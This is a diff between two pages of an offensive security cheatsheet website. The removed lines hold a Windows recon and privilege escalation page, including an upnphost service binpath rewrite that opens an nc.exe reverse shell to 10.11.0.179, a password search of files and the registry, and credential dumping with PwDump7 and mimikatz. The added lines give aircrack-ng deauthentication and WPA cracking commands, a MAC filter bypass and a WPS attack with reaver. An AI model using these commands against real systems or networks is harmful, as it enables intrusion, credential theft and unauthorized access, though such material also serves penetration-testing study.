@@ -6,7 +6,7 @@
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="revised" content="2019-07-02T15:56:57 CEST">
-<title>Local Recon and Enumeration :: Offensive Security Cheatsheet</title>
+<title>WiFi Cracking :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -23,7 +23,7 @@
 
     
   </head>
-  <body data-url="/windows-systems/local-and-physical/local_recon_enumeration/">
+  <body data-url="/wireless/wifi_cracking/">
     
       <header>
   <div class="logo">
@@ -864,11 +864,10 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/windows-systems/" class="dd-item parent haschildren
+    <li data-nav-id="/windows-systems/" class="dd-item haschildren
         ">
       <div>
-      <a href="/windows-systems/">Windows Systems</a>
-            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/windows-systems/">Windows Systems</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
     <li data-nav-id="/windows-systems/network-and-domain-recon/" class="dd-item haschildren
@@ -900,14 +899,13 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/windows-systems/local-and-physical/" class="dd-item parent haschildren
+    <li data-nav-id="/windows-systems/local-and-physical/" class="dd-item haschildren
         ">
       <div>
-      <a href="/windows-systems/local-and-physical/">Local and Physical</a>
-            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/windows-systems/local-and-physical/">Local and Physical</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
-      <li data-nav-id="/windows-systems/local-and-physical/local_recon_enumeration/" class="dd-item active">
+      <li data-nav-id="/windows-systems/local-and-physical/local_recon_enumeration/" class="dd-item">
         <div>
           <a href="/windows-systems/local-and-physical/local_recon_enumeration/">
             Local Recon and Enumeration
@@ -1223,13 +1221,14 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/wireless/" class="dd-item haschildren
+    <li data-nav-id="/wireless/" class="dd-item parent haschildren
         ">
       <div>
-      <a href="/wireless/">Wireless</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/wireless/">Wireless</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
-      <li data-nav-id="/wireless/wifi_cracking/" class="dd-item">
+      <li data-nav-id="/wireless/wifi_cracking/" class="dd-item active">
         <div>
           <a href="/wireless/wifi_cracking/">
             WiFi Cracking
@@ -1263,26 +1262,7 @@
     <option value="/shells-methods/" >
    Shells methods</option>
     <option value="/windows-systems/" >
-   Windows Systems</option> 
-    <option value="/windows-systems/network-and-domain-recon/" >
-  - 
-   Network and Domain Recon</option>
-    <option value="/windows-systems/local-and-physical/" >
-  - 
-   Local and Physical</option> 
-      <option value="/windows-systems/local-and-physical/local_recon_enumeration/"  selected>-- Local Recon and Enumeration</option>
-      <option value="/windows-systems/local-and-physical/physical_access/" >-- Physical Access</option>
-  
-    <option value="/windows-systems/exploitation/" >
-  - 
-   Exploitation</option>
-    <option value="/windows-systems/privilege-escalation/" >
-  - 
-   Privilege Escalation</option>
-    <option value="/windows-systems/post-exploitation-techniques/" >
-  - 
-   Post Exploitation Techniques</option>
-  
+   Windows Systems</option>
     <option value="/linux-systems/" >
    Linux Systems</option>
     <option value="/other-systems/" >
@@ -1294,7 +1274,9 @@
     <option value="/pwn/" >
    Pwn</option>
     <option value="/wireless/" >
-   Wireless</option>
+   Wireless</option> 
+      <option value="/wireless/wifi_cracking/"  selected>- WiFi Cracking</option>
+  
 
 
 
@@ -1317,152 +1299,39 @@
       </div>
     
 
-    <h1>Local Recon and Enumeration</h1>
+    <h1>WiFi Cracking</h1>
     
     
     
     
 
-<h3 id="basics">Basics</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">whoami
-ipconfig
-<span style="color:#111">type</span> “C:<span style="color:#8045ff">\D</span>ocuments and Settings<span style="color:#8045ff">\A</span>dministrator<span style="color:#8045ff">\D</span>esktop<span style="color:#8045ff">\p</span>roof.txt”
+<h3 id="aircrack-ng-suite">Aircrack-NG Suite</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Turning on the monitor mode</span>
+<span style="color:#75715e"># We can not see packages from SSIDs that we are not associated with</span>
+airmon-ng start wlan0**
+    
+<span style="color:#75715e"># Monitoring</span>
+<span style="color:#75715e"># We capture packages running:</span>
+airodump-ng mon0**
 
-<span style="color:#111">echo</span> %username%
-<span style="color:#111">echo</span> %path%
-ipconfig /all
-netstat -ano
+<span style="color:#75715e"># Speeding up</span>
+<span style="color:#75715e"># We can launch a de-authentication attack to speed up the process:</span>
+aireplay-ng -0 <span style="color:#ae81ff">3</span> -a &lt;macaddress of the ap&gt; mon0**
 
-<span style="color:#75715e"># Display hidden files</span>
-dir /a 
+<span style="color:#75715e"># Capturing packages</span>
+airodump-ng mon0 --bssid –c <span style="color:#f92672">(</span>channel<span style="color:#f92672">)</span> –w <span style="color:#f92672">(</span>file name to save<span style="color:#f92672">)</span>**
 
-<span style="color:#75715e"># Recursive dir</span>
-dir /s
-
-<span style="color:#75715e"># Available ? Ok drop jaws enum tool !</span>
-powershell “<span style="color:#111">$var</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>”
-
-<span style="color:#75715e"># Possible ? Ok drop windowsprivcheck.py</span>
-<span style="color:#d88200">&#34;C:\Python2X\python.exe&#34;</span> -c <span style="color:#d88200">&#34;print &#39;1&#39;&#34;</span>
-
-<span style="color:#75715e"># If x86 ? Drop windows-privesc-check.exe</span>
-
-<span style="color:#75715e"># You can use WinPrivCheck.bat to check common misconfigurations and KB</span>
-https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat</code></pre></div>
-<p><br/></p>
-
-<h3 id="enumeration-host-information">Enumeration - Host Information</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Exact OS version</span>
-<span style="color:#111">type</span> C:/Windows/system32/eula.txt
-
-<span style="color:#111">type</span> C:<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\d</span>rivers<span style="color:#8045ff">\e</span>tc<span style="color:#8045ff">\h</span>osts
-<span style="color:#111">set</span>
-hostname
-whoami
-<span style="color:#111">echo</span> %username%
-<span style="color:#111">echo</span> %path%
-systeminfo
-net users
-net localgroup administrators
-net accounts
-<span style="color:#111">set</span>
-DRIVERQUERY</code></pre></div>
-<p><br/></p>
-
-<h3 id="enumeration-network">Enumeration - Network</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ipconfig /all
-netstat -ano
-route print
-netsh firewall show state
-netsh firewall show config</code></pre></div>
-<p><br/></p>
-
-<h3 id="enumeration-users-groups">Enumeration - Users &amp; Groups</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">net users
-dir /b /ad “C:<span style="color:#8045ff">\D</span>ocuments and Settings”
-reg query “HKLM<span style="color:#8045ff">\S</span>OFTWARE<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\W</span>indows NT<span style="color:#8045ff">\C</span>urrentversion<span style="color:#8045ff">\W</span>inlogon” <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span> findstr “DefaultUserName DefaultDomainName DefaultPassword”
-net user alice
-<span style="color:#111">echo</span> %username%
-
-<span style="color:#75715e"># Get domain</span>
-powershell&gt; wmic computersystem get domain
-powershell&gt; systeminfo <span style="color:#111">|</span> findstr /B /C:<span style="color:#d88200">&#34;Domain&#34;</span>
-
-<span style="color:#75715e"># Domain</span>
-<span style="color:#75715e"># /dom could be a way to avoid endpoint solutions detection</span>
-powershell&gt; net user /dom
-powershell&gt; net user /domain
-powershell&gt; net user /domain &lt;username&gt;
-powershell&gt; net group /domain
-
-<span style="color:#75715e"># Get you own SID</span>
-powershell&gt; wmic useraccount where <span style="color:#111">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;&lt;username&gt;&#39;</span> get sid
-
-<span style="color:#75715e"># Get domain SPN</span>
-<span style="color:#111">$search</span> <span style="color:#f92672">=</span> New-Object DirectoryServices.DirectorySearcher<span style="color:#f92672">([</span>ADSI<span style="color:#f92672">]</span><span style="color:#d88200">&#34;&#34;</span><span style="color:#f92672">)</span>
-<span style="color:#111">$search</span>.filter <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;(servicePrincipalName=*)&#34;</span>
-<span style="color:#111">$results</span> <span style="color:#f92672">=</span> <span style="color:#111">$search</span>.Findall<span style="color:#f92672">()</span>
-foreach<span style="color:#f92672">(</span><span style="color:#111">$result</span> in <span style="color:#111">$results</span><span style="color:#f92672">)</span>
-<span style="color:#f92672">{</span>
-    <span style="color:#111">$userEntry</span> <span style="color:#f92672">=</span> <span style="color:#111">$result</span>.GetDirectoryEntry<span style="color:#f92672">()</span>
-    Write-host <span style="color:#d88200">&#34;User : &#34;</span> <span style="color:#111">$userEntry</span>.name <span style="color:#d88200">&#34;(&#34;</span> <span style="color:#111">$userEntry</span>.distinguishedName <span style="color:#d88200">&#34;)&#34;</span>
-    Write-host <span style="color:#d88200">&#34;SPNs&#34;</span>        
-    foreach<span style="color:#f92672">(</span><span style="color:#111">$SPN</span> in <span style="color:#111">$userEntry</span>.servicePrincipalName<span style="color:#f92672">)</span>
-    <span style="color:#f92672">{</span>
-        <span style="color:#111">$SPN</span>       
-    <span style="color:#f92672">}</span>
-    Write-host <span style="color:#d88200">&#34;&#34;</span>
-<span style="color:#f92672">}</span>
-
-<span style="color:#75715e"># Get user accounts which have SPN</span>
-<span style="color:#111">$search</span> <span style="color:#f92672">=</span> New-Object DirectoryServices.DirectorySearcher<span style="color:#f92672">([</span>ADSI<span style="color:#f92672">]</span><span style="color:#d88200">&#34;&#34;</span><span style="color:#f92672">)</span>
-<span style="color:#111">$search</span>.filter <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&#34;</span>
-<span style="color:#111">$results</span> <span style="color:#f92672">=</span> <span style="color:#111">$search</span>.Findall<span style="color:#f92672">()</span>
-foreach<span style="color:#f92672">(</span><span style="color:#111">$result</span> in <span style="color:#111">$results</span><span style="color:#f92672">)</span>
-<span style="color:#f92672">{</span>
-    <span style="color:#111">$userEntry</span> <span style="color:#f92672">=</span> <span style="color:#111">$result</span>.GetDirectoryEntry<span style="color:#f92672">()</span>
-    Write-host <span style="color:#d88200">&#34;User : &#34;</span> <span style="color:#111">$userEntry</span>.name <span style="color:#d88200">&#34;(&#34;</span> <span style="color:#111">$userEntry</span>.distinguishedName <span style="color:#d88200">&#34;)&#34;</span>
-    Write-host <span style="color:#d88200">&#34;SPNs&#34;</span>        
-    foreach<span style="color:#f92672">(</span><span style="color:#111">$SPN</span> in <span style="color:#111">$userEntry</span>.servicePrincipalName<span style="color:#f92672">)</span>
-    <span style="color:#f92672">{</span>
-        <span style="color:#111">$SPN</span>       
-    <span style="color:#f92672">}</span>
-    Write-host <span style="color:#d88200">&#34;&#34;</span>
-<span style="color:#f92672">}</span></code></pre></div>
-<p><br/></p>
-
-<h3 id="enumeration-running-processes">Enumeration - Running Processes</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tasklist /SVC
-schtasks /query /fo LIST /v
-net start
-accesschk_old.exe -uwcqv “Authenticated Users” * /accepteula
-accesschk_old.exe -ucqv upnphost
-sc qc upnphost
-sc config upnphost <span style="color:#111">binpath</span><span style="color:#f92672">=</span> “C:<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\T</span>emp<span style="color:#8045ff">\n</span>c.exe -nv <span style="color:#ae81ff">10</span>.11.0.179 <span style="color:#ae81ff">51337</span> -e C:<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\c</span>md.exe”
-sc config upnphost <span style="color:#111">obj</span><span style="color:#f92672">=</span> “.<span style="color:#8045ff">\L</span>ocalSystem” <span style="color:#111">password</span><span style="color:#f92672">=</span> “”
-net stop upnphost
-net start upnphost</code></pre></div>
-<p><br/></p>
-
-<h3 id="enumeration-files">Enumeration - Files</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dir /a /s *pass* <span style="color:#f92672">==</span> *cred* <span style="color:#f92672">==</span> *vnc* <span style="color:#f92672">==</span> *.config* <span style="color:#f92672">==</span> *proof.txt* <span style="color:#f92672">==</span> *local.txt*
-findstr /si password *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.vbs <span style="color:#ae81ff">2</span>&gt;nul
-<span style="color:#111">type</span> “C:<span style="color:#8045ff">\D</span>ocuments and Settings<span style="color:#8045ff">\A</span>dministrator<span style="color:#8045ff">\D</span>esktop<span style="color:#8045ff">\p</span>roof.txt”</code></pre></div>
-<p><br/></p>
-
-<h3 id="gathering-passwords-hashes">Gathering Passwords/Hashes</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.<span style="color:#8045ff">\P</span>wDump7.exe <span style="color:#f92672">(</span>nécessite libay32.dll<span style="color:#f92672">)</span> <span style="color:#f92672">=</span>&gt; Dump SAM base
-.<span style="color:#8045ff">\m</span>imikatz.exe
-    privilege::debug
-    privilege::backup
-    token::elevate</code></pre></div>
+<span style="color:#75715e"># Cracking the cap</span>
+aircrack-ng RHAWEP-0.1-cap -w /wordlist**</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Bypass MAC filter</span>
+macchanger –m B0:D0:9C:5C:EF:86 wlan0**</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Cracking WPS</span>
+reaver –i mon0 –b &lt;bssid&gt; –d <span style="color:#ae81ff">0</span>**</code></pre></div>
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/windows-systems/local-and-physical/" title="Local and Physical"> <i class="fa fa-chevron-left"></i><label>Local and Physical</label></a>
-    <a class="nav nav-next" href="/windows-systems/local-and-physical/physical_access/" title="Physical Access" style="margin-right: 0px;"><label>Physical Access</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/wireless/" title="Wireless"> <i class="fa fa-chevron-left"></i><label>Wireless</label></a>
+    <a class="nav nav-next" href="/open-source-intelligence-osint/" title="Open Source Intelligence (OSINT)" style="margin-right: 0px;"><label>Open Source Intelligence (OSINT)</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -1479,7 +1348,7 @@ findstr /si password *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.
 
     
     <div class="github-link">
-      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Windows%20Systems/Local%20and%20Physical/Local_Recon_Enumeration.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Wireless/WiFi_Cracking.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
